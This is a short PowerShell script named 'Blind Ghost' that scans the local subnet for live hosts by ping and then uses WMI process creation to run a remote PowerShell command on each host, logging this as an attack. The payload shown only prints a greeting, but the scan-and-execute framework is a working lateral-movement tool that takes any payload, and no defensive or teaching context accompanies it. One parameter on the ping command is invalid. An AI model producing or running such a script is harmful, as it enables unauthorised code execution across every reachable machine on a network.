# Blind Ghost
function debug {
  param ([string]$msg)
  $ts = get-date -format "hh:mm:ss"
  write-host "[$ts] $msg"
}
function find-targets {
  debug "scanning network for live hosts..."
  $subnet = (get-netipaddress -addressfamily ipv4 | where-object { $_.interfacealias -notlike "*loopback*" }).ipaddress -replace "\d+$", ""
  $targets = 1..254 | foreach-object {
    $target = "$subnet$_"
    if (test-connection -computername $target -count 1 -quiet -errorsilentlycontinue) {
      debug "found live host: $target"
      $target
    }
  }
  return $targets
}
function execute-payload {
  param ([string]$target)
  try {
    invoke-wmimethod -class win32_process -name create -argumentlist "powershell -c `"write-output 'Hello friend...'`"" -computername $target
    debug "payload executed on $target"
  } catch {
    debug "failed to execute payload on $target"
  }
}
function start-attack {
  debug "starting attack..."
  $targets = find-targets
  foreach ($target in $targets) {
    execute-payload -target $target
  }
}

start-attack
